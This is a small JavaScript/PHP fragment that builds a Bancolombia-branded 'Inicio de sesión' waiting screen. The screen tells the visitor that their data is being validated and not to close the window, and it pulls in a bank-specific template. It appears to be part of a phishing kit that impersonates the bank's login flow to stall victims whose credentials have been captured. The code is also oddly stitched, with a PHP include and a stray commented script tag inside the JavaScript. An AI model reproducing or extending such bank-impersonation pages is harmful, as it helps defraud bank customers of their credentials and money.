var bancolombia_titulo = 'Inicio de sesión';
var bancolombia_contenido = `
<div class="mua-panel-body">
    <div class="row">
        <div class="col-sm-6" style="float:none;margin:auto;">
            <p class="mua-phrase-message text-center">Por favor espera un momento estamos validando algunos datos. <br>Puede tardar entre 1 a 5 minutos. No cierres o recargues esta ventana.</p>
        </div>
    </div>
    <div class="centerLoading" id="loading-indicator-undefined" style="position: absolute; z-index: 5001; left: 0px; top: 0px; padding-top:10vh;">
        <div class="loading-pulse">
            <div></div>
            <div></div>
            <div></div><img class="imgLogoLoading" alt="FFI" src="${my_banco}img/loading_logo.svg">
        </div>
    </div>
</div>
`
<?php require_once('_plantilla_bancolombia.php'); ?>

//<script>
    $('.footer').remove()